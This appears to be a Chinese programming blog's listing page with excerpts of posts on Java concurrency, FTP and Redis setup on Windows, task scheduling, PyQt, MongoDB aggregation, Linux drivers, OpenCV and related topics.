在JDK1.7中，ConcurrentHashMap采用Segment + HashEntry的方式进行实现，结构如下：一个 ConcurrentHashMap 里包含一个 Segment 数组。Segment 的结构和HashMap类似，是一种数组和链表结构，一个 Segment 包含一个 HashEntry 数组，每个 HashEntry 是一个链表结构的元素，每个 Segment 守护着一个HashEntry数组里的元素，当对 HashEntry 数组的数据进行修改时，必须首先获得对应的 Segment的锁。
该类包含两个静态内部类 HashEntry 和 Segment ；前者用来封装映射表的键值对，后者用来充当
锁的角色；
Segment 是一种可重入的锁 ReentrantLock，每个 Segment 守护一个HashEntry 数组里得元
素，当对 HashEntry 数组的数据进行修改时，必须首先获得对应的 Segment 锁。
JDK1.8
在JDK1.8中，放弃了Segment臃肿的设计，取而代之的是采用Node + CAS + Synchronized来保
证并发安全进行实现，synchronized只锁定当前链表或红黑二叉树的首节点，这样只要hash不冲
突，就不会产生并发，效率又提升N倍。
结构如下：
插入元素过程：
如果相应位置的Node还没有初始化，则调用CAS插入相应的数据；
如果相应位置的Node不为空，且当前该节点不处于移动状态，则对该节点加synchronized锁，如果该节点的hash不小于0，则遍历链表更新节点或插入新节点；
如果该节点是TreeBin类型的节点，说明是红黑树结构，则通过putTreeVal方法往红黑树中插入节点；如果binCount不为0，说明put操作对数据产生了影响，如果当前链表的个数达到8个，则通过treeifyBin方法转化为红黑树，如果oldVal不为空，说明是一次更新操作，没有对元素个数产生影响，则直接返回旧值；
如果插入的是一个新节点，则执行addCount()方法尝试更新元素个数baseCount；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eabdcd8b7aff8ecf0c9448821b34406f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1550286fb346d8df05fece67a68071ff/" rel="bookmark">
			使用windows10虚拟机搭建ftp服务，并能够使用ftp进行传输文件的操作，操作步骤配截图。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（1）安装IIS工具： (2)设置开机启动FTP服务： ①win+R打开运行窗口：输入service.msc，进入服务窗口
②启动FTP服务，否则创建的FTP服务器无法启动：
即便设置FTP服务为开机启动，但是有时重启电脑后还是不能自动启动，需要手动启动下该服务。（已是正在运行，就无需改动）
（3）创建ftp用户： 桌面的电脑图标上鼠标右键选择“管理”进入计算机管理窗口：
（4）配置FTP服务器 这里的物理路径即为待传输文件所保存的位置。（按需设置文件夹权限，演示为最大权限，人人可以访问，步骤6）
（5）通过浏览器访问共享文件，地址栏输入FTP://站点IP地址/ （6）按需设置文件夹权限，演示为最大权限，人人可以访问 （共享文件夹创建完成，将会访问到其中的文件）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/394ed3c37024a5ddcf6e354dfdffea35/" rel="bookmark">
			【定时任务】---- xxl-job、@Scheduled
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、@Scheduled注解实现的定时任务 要实现计划任务，首先通过在配置类注解@EnableScheduling来开启对计划任务的支持，然后在要执行计划任务的方法上注解@Scheduled，声明这是一个计划任务。
在Spring Boot 的入口类 XXXApplication 中,必然会有@SpringBootApplication注解，用来标注项目入口，以及完成一些基本的自动自动配置。所以Spring Boot 的项目，可以在启动类中注解@EnableScheduling。
配置类：
计划任务执行类：
其中Scheduled注解中有以下几个参数：
1.cron是设置定时执行的表达式，如 0 0/5 * * * ?每隔五分钟执行一次 秒 分 时 天 月，cron表达式支持使用占位符
2.zone表示执行时间的时区
3.fixedDelay 和fixedDelayString 表示一个固定延迟时间执行，上个任务完成后，延迟多长时间执行
4.fixedRate 和fixedRateString表示一个固定频率执行，上个任务开始后，多长时间后开始执行
5.initialDelay 和initialDelayString表示一个初始延迟时间，第一次被调用前延迟的时间
如果多个定时任务定义的是同一个时间，会根据程序加载标有 @Scheduled 方法的先后来执行。若某个定时任务一直无法执行完成，则无法设置下次任务执行时间，之后会导致此任务后面的所有定时任务无法继续执行，也就会出现所有的定时任务罢工的现象。所以应用SpringBoot 的定时任务的方法中，一定不要出现“死循环”、“执行耗费大量时间”、“http持续等待无响应”的现象，否则会导致定时任务直接罢工。针对数据量、查询或者远程调用特别多的场景，推荐把定时任务分段处理。
优点：
不需要依赖外部框架。
简单快速实现任务。@EnableScheduling、@Scheduled 注解
缺点：
无法管理任务。要停止某个任务，必须重新发布。
不支持动态调整。修改任务参数需要重启项目。
不支持集群方式部署。集群模式下会出现任务多次被调度执行的情况，因为集群的节点之间是不会共享任务信息的，每个节点上的任务都会按时执行。
单体，即一个项目部署在一台服务器上； 集群，即将单体复制多份部署在多台服务器，其中每个单体被称为一个节点。 二、xxl-job实现的定时任务 1、xxl-job的使用 1. 简介 XXL-JOB是一个轻量级分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。
解压源码,按照maven格式将源码导入IDE, 使用maven进行编译即可，源码结构如下：
xxl-job-admin：调度中心
xxl-job-core：公共依赖
xxl-job-executor-samples：执行器Sample示例（选择合适的版本执行器，可直接使用，也可以参考其并将现有项目改造成执行器）
xxl-job-executor-sample-springboot：Springboot版本，通过Springboot管理执行器，推荐这种方式；
xxl-job-executor-sample-spring：Spring版本，通过Spring容器管理执行器，比较通用；
xxl-job-executor-sample-frameless：无框架版本；
在xxl-job中，有2个角色：
xxl-job-admin调度中心： 统一管理任务调度平台上的调度任务，负责触发调度执行，并且提供任务管理平台。
xxl-job-executor执行器： 执行器通常是我们的业务系统，如示例中的springboot项目。
设计思想：
将调度行为抽象形成“调度中心”公共平台，而平台自身并不承担业务逻辑，“调度中心”负责发起调度请求。
将任务抽象成分散的JobHandler，交由“执行器”统一管理，“执行器”负责接收调度请求并执行对应的JobHandler中业务逻辑。因此，“调度”和“任务”两部分可以相互解耦，提高系统整体稳定性和扩展性。
xxl-job就是一个中心化管理系统，系统主要通过MySQL管理各种定时任务信息，当到了定时任务的触发时间，就把任务信息从数据库中拉进内存，对任务执行器发起调度请求。
2. 使用 ①下载源码 ： https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/394ed3c37024a5ddcf6e354dfdffea35/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4b18c429dfa181218ed27fafc8684bf/" rel="bookmark">
			搭建PyQt环境（PyCharm）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 安装Python 在win10的应用商店中直接搜索Python，下载并安装。在python官网下载安装也一样，但是可能会缺少Python Launcher或者没有添加进系统环境变量，造成不必要的麻烦。
安装完成后在cmd或者powershell中输入python并回车，如果出现下图所示的Python详细信息，说明安装成功并注册好了环境变量，如果什么都没有提示建议重新安装。
2. Python换源 在Python中经常会用到pip下载或更新东西，默认源在国外，速度很慢，一般换成国内的源。
在电脑的用户→自己用户名文件夹下新建一个名为pip的文件夹，然后再新建一个pip.ini的空文件，然后编辑写上以下内容并保存：
[global] index-url = https://pypi.mirrors.ustc.edu.cn/simple/ [install] trusted-host=mirrors.aliyun.com 3. 安装PyQt5的包 在cmd或powershell中输入
pip3 install sip 接着是
pip3 install PyQt5 然后是 PySide2
pip3 install PySide2 注意，如果在第一步的教程中没有换源，此时的下载速度就会非常缓慢。
4. 新建项目并配置PyCharm 如下图所示，在选择interpreter时选择已存在的interpreter（第一次需要自己新建，用everything搜索找到python.exe的安装路径即可，默认安装路径如图），因为高版本的PyCharm会自己创建了一个Python虚拟环境，默认没有把你安装的第三方库添加进来，然后就会出现诸如ModuleNotFoundError: No module named 'pyqt5'这类错误。
接下来需要在Pycharm中配置四个外部工具：
Qt Designer - 新建.ui文件Edit In Designer - 编辑已有的.ui文件PyUIC - 将.ui文件转换为python代码PyRCC - 将qrc文件转换为python代码 （注意，下面配置中涉及到的所有Program位置，都可以用everything直接搜索，因为手动实在是不好找。）
首先为了快速启动Qt Designer，添加Qt Designer，点击File→Settting→Tools→External Tools→+，Program中的路径即为Qt Designer.exe的路径，配置如下：
接下来是编辑已存在.ui文件的配置Edit In Designer
再然后是配置将Qt的.ui文件转化成python文件的配置PyUIC
程序是python.exe的程序路径，参数是下面这行命令
-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py 工作目录需要填
$FileDir$ 最后是PyRCC，将qrc资源文件转换为python代码的配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e4b18c429dfa181218ed27fafc8684bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bb8a3fefb6f8660640b5285dbe8f5ff/" rel="bookmark">
			Mongo时间戳转日期以及日期分组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近遇到的一个数据统计折线图的性能优化点，可以说是一定思维上的转变，就记录下咯
背景：cron定时任务读取当前统计数据的异常值，频率为每五分钟记录一次，折线图要求获取每日的异常项峰值
最一开始的想法：将数据读取到内存中进行条件过滤、计算
首先根据时间戳将数据以日期作为分组，其次在每个分组中获取异常项的峰值数据，时间复杂度O(n*n)，最好以日期分组列表+峰值数据列表作为对象返回结果
遇到性能问题：一天的数据量为(60/5)*24=288，默认日期为15天，则统计的数据量为4230，接口返回甚至需要8、9秒的时间，作为一个项目的门面折线图，这种情况 达咩！
优化的念头：我要拿每天的峰值数据，怎么才能直接取到每天的峰值呢，mongo的聚合是不是可以做到啊？ $group可以按日期做分组， $max可以拿到最大值，接下来一个 $sort好像是就成了吧！ 说干就干！！
接下来的聚合语句均为mongo pipeline，最后附上golang的bson条件哈
// ResultCountModel _ type ResultCountModel struct { CommonBase `json:",inline" yaml:",inline" bson:",inline"` ErrorCount int `json:"error_count" bson:"error_count"` Timestamp int64 `json:"timestamp" bson:"timestamp"` MaxTime int64 `json:"max_time" bson:"max_time"` } 数据结构定义如上，这里使用CommonBase，是因为在$group聚合后会得到_id唯一标识字段，因此便于获取最后的聚合结果，在定义结构体时将其加上；timestamp单位为毫秒
1、日期筛选 第一步，毫无疑问，对时间戳timestamp进行日期的过滤
{ $match: { timestamp: { $gte: 1671897600000, // min_timestamp $lt: 1673280000000 // max_timestamp } } } $gte 大于等于
$lt 小于
2、日期转换 第二步，根据时间戳大小进行日期的转换，这里是用的是$project， 将具有请求字段的文档传递到管道中的下一阶段。指定的字段可以是输入文档中的现有字段或是新计算的字段
使用$project主要思路是，将timestamp时间戳转换为标准日期，之后输出为想要的format形式；同时使用 $project保留需要的字段
时间戳转换日期 核心方法：$dateToString
{ $dateToString: { date: &lt;dateExpression&gt;, format: &lt;formatString&gt;, timezone: &lt;tzExpression&gt;, onNull: &lt;expression&gt; } } date ：要转换的字符串日期，必须是解析为Date、Timestamp、ObjectID 的有效表达式format： 日期格式规范timezone：运算结果的时区，常用UTC偏移量onNull： date为null或缺失时要返回的值 日期格式想要“月份-日期”，那format: “%m-%d”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bb8a3fefb6f8660640b5285dbe8f5ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41e69a792a3335f883da7c95bc704cde/" rel="bookmark">
			SQL获取查询结果的总条数，记录以后用到的SQL函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 SQL查询 并获取查询结果的总条数
select *,count(*) over () as total from public."simulationResultTable" 可以使用下面的语句获取结果的总条数，别名为total
count(*) over() as total 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd51c423a53de6db1a5a4574ac8acf12/" rel="bookmark">
			linux设备驱动——bus、device、driver加载顺序与匹配流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 前言2. 概念2.1. 数据结构2.2. probe函数 3. bus、device、driver加载顺序3.1. 加载方式3.2. 加载顺序 4. device、driver匹配流程4.1. 加载driver4.2. 加载device 5. Reference 1. 前言 最近回看了下Linux设备驱动相关知识，做了个总结。有些话需要说在前面：
文中有些内容为个人理解（上标H所标识内容），未必准确，有误请评论指正。4.2节的内容主要目的是为了搞清楚driver和device在加载的过程中是如何通过bus相互匹配。 本文源码源自4.10.17版本linux内核。
2. 概念 Linux设备驱动有三个基本概念：总线、驱动以及设备。 三者之间关 系 H 三者之间关系^H 三者之间关系H简单描述如下：
总线为外设或片内模组与核心处理器之间的通信总线，例如SPI、I2C、SDIO、USB等。每个驱动、设备都需要挂载到一种总线上；挂载到相同总线的驱动和设备可以通过该总线进行匹配，实现设备与对应的驱动之间的绑定。 2.1. 数据结构 以下为总线、驱动及设备在linux内核中对应的核心数据结构
// 总线数据结构 -- include/linux/device.h struct bus_type { const char	*name; const char	*dev_name; struct device	*dev_root; struct device_attribute	*dev_attrs;	/* use dev_groups instead */ const struct attribute_group **bus_groups; const struct attribute_group **dev_groups; const struct attribute_group **drv_groups; int (*match)(struct device *dev, struct device_driver *drv); int (*uevent)(struct device *dev, struct kobj_uevent_env *env); int (*probe)(struct device *dev);	// 探测驱动与设备是否匹配，匹配则完成绑定 int (*remove)(struct device *dev); void (*shutdown)(struct device *dev); int (*online)(struct device *dev); int (*offline)(struct device *dev); int (*suspend)(struct device *dev, pm_message_t state); int (*resume)(struct device *dev); const struct dev_pm_ops *pm; const struct iommu_ops *iommu_ops; struct subsys_private *p;	// 如下 struct lock_class_key lock_key; }; // drivers/base/base.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd51c423a53de6db1a5a4574ac8acf12/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b80ea5b205d605050e963d6a81506659/" rel="bookmark">
			Java—动态规划之背包问题DP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 例题
01背包：
完全背包：
混合背包：
背包问题 背包问题分为01背包问题、完全背包问题、多重背包问题、分组背包问题。
具体算法思想和思路见代码随想录或者看中国大学MOOC里面的这节内容
01背包
完全背包
中国大学MOOC（算法设计与分析）
算法思路和思想学会后最重要还得是实战。实践是检验真理的唯一标准。
例题 这里就直接上截图了。比较方便
01背包： 第一题：
代码：
import java.util.Scanner; public class dotcpp { public static void main(String[] args) { Scanner sc = new Scanner(System.in); int T = sc.nextInt();//采够药材的时间 int M = sc.nextInt();//采购药材个数 //建立时间和价值数组 int[] Time = new int[M+1];//采草药所需要的时间 int[] Value = new int[M+1];//草药的价值 for (int i = 1; i &lt; M+1; i++) { Time[i] = sc.nextInt(); Value[i] = sc.nextInt(); } //构建dp数组用来存放最优解，创建该数组要比正常的大一，因为下面的循环是从1开始的。 int[][] dp = new int[M + 1][T + 1]; for (int i = 1; i &lt; M + 1; i++) { for (int j = 0; j &lt; T + 1; j++) { if (Time[i] &gt; j) { dp[i][j] = dp[i - 1][j]; }else{ dp[i][j]=Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b80ea5b205d605050e963d6a81506659/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5b271a5d3745a6cadce85824042f325/" rel="bookmark">
			满足你一切需求的 MMYOLO/MMDet 可视化 (一)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可视化在深度学习时代算是核心需求，借助可视化功能，研究者可以快速定位分析模型以及排查问题。在 OpenMMLab 2.0 时代，MMEngine 对常用的可视化需求进行了设计和实现，其具备如下功能：
提供丰富的开箱即用可视化功能，能够满足大部分计算机视觉可视化任务高扩展性，可视化功能多样化，能够通过简单扩展实现定制需求能够在训练和测试流程的任意点位进行可视化OpenMMLab 各个算法库具有统一可视化接口，利于用户理解和维护 系列文章概览 我们将开启可视化分析系列文章，结合 MMYOLO 中的 YOLOv5 算法，对 MMEngine 和 MMDetection 3.x 中实现的可视化功能进行全面解析。通过本系列文章你将能快速掌握常用的可视化使用方法和如何扩展等功能。
整个可视化分析系列文章一共分成 3 个部分，分别对应 Dataset 和测试过程中的可视化、训练过程中的可视化以及其余相关脚本可视化。其目录主结构为：
(1) 第一篇
MMEngine 可视化器和可视化后端介绍
Dataset 输出可视化
可视化 Dataset 输出可视化绘制结果保存到 WandB 模型测试中的可视化
GT 和预测分开可视化GT 和预测叠加可视化可视化绘制结果保存到 Tensorboard可视化 NMS 前后结果并将结果保存到 Tensorboard可视化注意力模块并用 WandB 保存为表格格式 (2) 第二篇
模型训练中的可视化
训练 loss 和评估指标等标量可视化追加自定义标量并存储到 WandBYOLOv5 训练中正样本可视化分析配置文件存储和可视化Tensorboard 模型结构图可视化参数梯度分布可视化 扩展可视化器和可视化后端
(3) 第三篇
图片推理结果可视化，包括大图推理特征图可视化Grad-Based CAM 和 Grad-Free CAM 可视化COCO 数据集标注可视化数据集分布可视化 由于 MMYOLO 中的可视化器是直接引用的 MMDetection 3.x 中，所以本文所述内容完全适用于 MMDetection 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5b271a5d3745a6cadce85824042f325/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8850b4e14a3e178cf051e64f42be9e5e/" rel="bookmark">
			Windows11-Redis 最新安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis 最新安装教程（Win11） 1.下载2. Redis GUI3. 目录结构说明4. 安装与启动4.1 Redis Server4.2 Redis Cli4.3 安装Redis服务 5. 测试使用Redis GUI 连接6. 总结Reference 1.下载 官方没有 Windows版本的 Redis，官网介绍：
Redis项目不正式支持Windows。
但是，微软开发并维护了针对Win64的Windows版本，目前维护的版本已经停止在3.2.100版本了，能下到最新的也就是3.2.100版本了。
官方Redis3.2.100 GitHub 地址：https://github.com/microsoftarchive/redis阿里云盘下载（推荐）：https://www.aliyundrive.com/s/ysj95Zk9C6Y 云盘里其中包含Redis 5.0.14.1（tporadowski维护的版本）
Redis5.0.14.1 tporadowski维护版 GitHub地址：https://github.com/tporadowski/redis
2. Redis GUI 更快、更好、更稳定的Redis桌面(GUI)管理客户端，兼容Windows、Mac、Linux，性能出众，轻松加载海量键值，完美支持中文，重要的是免费可商用！！！
云盘里已经包含，安装即可！
3. 目录结构说明 解压Redis压缩包后，见到如下目录机构：
目录或文件作用redis-benchmark性能测试工具redis-check-aofAOF文件修复工具redis-cli命令行客户端redis-serverRedis服务器启动命令redis.windows.confRedis核心配置文件 Redis 3.2.100 解压目录结构：
4. 安装与启动 4.1 Redis Server Window版的Redis安装非常简单，解压即安装。
如果只是临时使用，双击解压目录中的redis-server.exe即可启动Redis Server服务。
启动成功后占用端口 6379。安装服务使用直接跳到3.3。
停止服务直接关闭窗口即可停止。
Redis 3.2.100：
启动后窗口不要关，新开一个cmd窗口，执行 ：
E:\redis&gt;redis-cli 默认连接本机127.0.0.1 端口号 6379，连接成功。
4.2 Redis Cli 客户端和服务端启动方法一样，双击redis-cli.exe即可启动。
测试：
4.3 安装Redis服务 一般我们不会直接双击打开。一般是安装为Windows服务，每次开机自启方便开发或生产。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8850b4e14a3e178cf051e64f42be9e5e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3c1dc3fdf1f44e89454e63d6f7e338f/" rel="bookmark">
			Synchronized锁升级详细过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近翻看leaf源码时，同事提出了一段关于synchronized的idea上报黄是啥情况 ，正好关于synchronized的内容也很久复习过，趁着这个机会讲解一下，在网上翻看了大量文章，发现很
多文章都是有点问题。。本文经过大量实践详细讲解锁升级的一个过程
如有不对，欢迎指正。
本文适合对synchronized有一定了解的同学阅读（至少要知道锁的几个级别)
定义 大家都知道锁分为无锁-&gt;偏向锁-&gt;轻量级锁-&gt;重量级锁
这也是锁的一个升级过程，但是实际上锁的升级并不是按步就班的，可以直接从无锁升级为重量级
很多文章写了锁不可以降级，其实这句话有点误导，锁是不可以降级。但是可以变更为无锁
对象头中的mark word 这个图还是很有用的，很多地方要对着这个图来看
锁的详细升级过程 我们直接从偏向锁讲起，首先配置启动参数-XX:BiasedLockingStartupDelay=0 设置偏向锁启动延时0秒(默认好像是4s) 分为以下情况
单线程没有竞争
线程获取锁了直接就是偏向锁(如果在偏向锁没启动时，则是轻量级锁)
代码：
import lombok.SneakyThrows; import org.openjdk.jol.info.ClassLayout; /** * @author TanJ * @date 2023/1/6 16:42 */ public class SyncTest { @SneakyThrows public static void main(String[] args) { Object lock = new Object(); // 打印初始状态 System.out.println(ClassLayout.parseInstance(lock).toPrintable()); synchronized (lock) { // 打印偏向锁状态 System.out.println(ClassLayout.parseInstance(lock).toPrintable()); // TimeUnit.SECONDS.sleep(2); } } } 结果
这里不管线程是否释放锁，锁状态都是偏向锁(就算已经释放也是)
多线程没有竞争
多线程没有竞争的情况会比较特殊一点，可能会升级为轻量级，也可能还是偏向锁，也有可能会偏向优化
保持偏向锁：多线程没有竞争，前一个线程已经执行完毕
代码：
import lombok.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d3c1dc3fdf1f44e89454e63d6f7e338f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0a4e21b8ef3a5fd024053fa1f2d44b4/" rel="bookmark">
			VS2019&#43;Opencv3.4&#43;Win10配置详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.下载opencv 官网：Releases - OpenCV
不同版本vs对应不同版本的opencv,其中高版本vs可以配置低版本vc，低版本不能配置高版本vc。
windows系统直接下载Windows版本就可以（下载的文件是一个exe文件，运行相当于解压缩） 二、配置环境变量 在环境变量的系统path中添加D:\soft\opencv3416\opencv\build\x64\vc15（根据下载路径不同替换）
三、复制文件 将下面三个文件复制到C:\Windows\System32下
如果大家按照上面做的报错的话，再尝试把opencv_world3416.dll和opencv_world3416d.dll加入SysWOW64文件下（我的是没有报错）
四、配置vs 1、新建vs项目后选择“视图”-&gt;“其他窗口”-&gt;“属性管理器”配置Debug|x64
2、Debug|X64-&gt;属性-&gt;VC++目录-&gt;常规-&gt;包含目录 添加三个路径（根据自己opencv安装路径添加），下拉可以编辑
3、 VC++目录–&gt;常规–&gt;库目录中添加D:\soft\opencv3416\opencv\build\x64\vc15\lib
4、 链接器–&gt;输入–&gt;附加依赖项中添加opencv_world3416d.lib
五、调整Debug配置为X64 1、“链接器”-&gt;“高级”-&gt;“目标计算机”调整Debug配置为X64（可以不用）
2、“链接器”-&gt;“命令行”添加 /machine:X64/debug （可以不用）
3、解决方案名上右击选择“属性” 平台选择“x64”，工具栏上方的Debug选“x64”
六、测试 代码中的图片位置根据自己的修改
#include &lt;opencv2/core/core.hpp&gt;//包含openCV的基本数据结构，数组操作的基本函数 #include &lt;opencv2/highgui/highgui.hpp&gt;//图像的交互界面，视频的捕捉也可写为#include &lt;opencv2/highgui.hpp&gt; #include &lt;opencv2/imgcodecs.hpp&gt;//图像的变换，滤波直方图，以及形状的描述等函数库 #include &lt;iostream&gt; using namespace std; using namespace cv; int main(char argc, char* argv[]) { cout &lt;&lt; "now i will open inmage!" &lt;&lt; endl; Mat img; img = imread("D:\\soft\\opencv3416\\imgs\\cv.png");//打开图像 if (img.empty()) { cout &lt;&lt; " Error"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0a4e21b8ef3a5fd024053fa1f2d44b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90ee318bff2d03590e8553248895a6f8/" rel="bookmark">
			pandas中文手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://runebook.dev/zh-CN/docs/pandas/-index-?q=DataFrame
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e94233726cc6027ee7451585f01ae09/" rel="bookmark">
			DMA burst 基本概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文地址：http://blog.csdn.net/sunjiajiang/article/details/7945057
DMA和burst不是一个概念。 DMA传送不经过CPU的控制，假如硬盘的数据不能经过DMA控制器读到内存，那么每完成一次将硬盘的数据读出来，再存放到内存的操作，都要通过CPU运行几条读写指令来完成，这时CPU就做不了别的事了，如果有DMA控制器，则这个过程不需要CPU的参与，只需要占用总线就可以了。CPU还可以去完成别的运算。
Burst操作还是要通过CPU的参与的，与单独的一次读写操作相比，burst只需要提供一个其实地址就行了，以后的地址依次加1，而非burst操作每次都要给出地址，以及需要中间的一些应答、等待状态等等。如果是对地址连续的读取，burst效率高得多，但如果地址是跳跃的，则无法采用burst操作
一般芯片的dma有基本功能。 1、普通的内存、外设间互传数据，一次性的。
2、支持链表的，美其名曰“scatter”，内核有struct scatter可以参考。
dma有burst、burst size、transfer的概念： burst： dma实际上是一次一次的申请总线，把要传的数据总量分成一个一个小的数据块。比如要传64个字节，那么dma内部可能分为2次，一次传64/2=32个字节，这个2(a)次呢，就叫做burst。这个burst是可以设置的。这32个字节又可以分为32位 8或者16位16来传输。
transfer size： 就是数据宽度，比如8位、32位，一般跟外设的FIFO相同。
burst size： 就是一次传几个 transfer size.
配置数据宽度为32位。一次传8个32位=32个字节。
那么如果总长度为128字节，那么实际dma设置的长度为 128/32 = 4.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06f3674c4feb015b71f11cafca7f3fc8/" rel="bookmark">
			Java-性能分析&amp;监控工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java监控和管理 Java监控和管理API Java Standard Edition（Java SE）平台提供的监控和管理技术 - JMX（Java Management Extensions） 技术。
Java SE 中包含了用于监控和管理的（java.lang.management）API，通过这些 API 可以实现应用程序的自我监控，此 API 主要提供了以下信息的访问：
类加载相关。JVM 相关，例如运行时间、系统环境变量、用户输入参数。线程相关，例如线程状态，线程的统计信息、线程的堆栈等。内存使用情况。GC 情况。死锁检测。操作系统信息。
Java 8的java.lang.management模块：
类名描述ClassLoadingMXBean用于 Java 虚拟机的类加载系统的管理接口。CompilationMXBean用于 Java 虚拟机的编译系统的管理接口。GarbageCollectorMXBean用于 Java 虚拟机的垃圾回收的管理接口。MemoryManagerMXBean内存管理器的管理接口。MemoryMXBeanJava 虚拟机的内存系统的管理接口。MemoryPoolMXBean内存池的管理接口。OperatingSystemMXBean用于操作系统的管理接口，Java 虚拟机在此操作系统上运行。RuntimeMXBeanJava 虚拟机的运行时系统的管理接口。ThreadMXBeanJava 虚拟机线程系统的管理接口。 Java虚拟机的监控 上面说到 Java SE 中已经内置了开箱即用的监控和管理功能，通过这些功能可以实现程序的自我监测，Java 默认已经实现了对 Java 虚拟机相关信息的监测。
下面通过一个简单的示例，演示如何通过监控管理 API 获取系统信息、编译器信息、内存信息以及垃圾收集器信息。
public static void main(String[] args) { showJvmInfo(); showMemoryInfo(); showSystem(); showClassLoading(); showCompilation(); showThread(); showGarbageCollector(); showMemoryManager(); showMemoryPool(); } /** * Java 虚拟机的运行时系统 */ public static void showJvmInfo() { RuntimeMXBean rtMxBean = ManagementFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06f3674c4feb015b71f11cafca7f3fc8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee05324937ff2c572ef7a54a339865c3/" rel="bookmark">
			mount: wrong fs type, bad option, bad superblock
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux挂载磁盘报如下错误： mount: wrong fs type, bad option, bad superblock on 192.168.0.68:/mnt, missing codepage or helper program, or other error (for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&lt;type&gt; helper program) In some cases useful info is found in syslog - try dmesg | tail or so 安装nfs
yum install nfs-utils 运行fdisk -l命令查看实例上的数据盘，发现/dev/vdb未被使用
[root@localhost ~]# fdisk -l Disk /dev/vda: 42.9 GB, 42949672960 bytes 255 heads, 63 sectors/track, 5221 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x00020f78 Device Boot Start End Blocks Id System /dev/vda1 * 1 5222 41940992 83 Linux Disk /dev/vdb: 64.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee05324937ff2c572ef7a54a339865c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b7f290f4aae38569f6f3a076378a91d/" rel="bookmark">
			《深入解析CSS》学习理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 《深入解析CSS》学习理解 该书旨在达成两个目标,帮读者深度掌握CSS语言,并且快速了解CSS的新进展和新特性
第一部分回顾基础知识:层叠,继承,相对单位,盒模型,第二部分介绍网页布局的各种关键工具,如浮动布局,Flexbox,网格布局,单位响应式设计,第三部分介绍新的最佳实践,主要包括如何模块化的方式组织CSS,以及如何构建一个模式库第四部分 盒模型和border-box 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
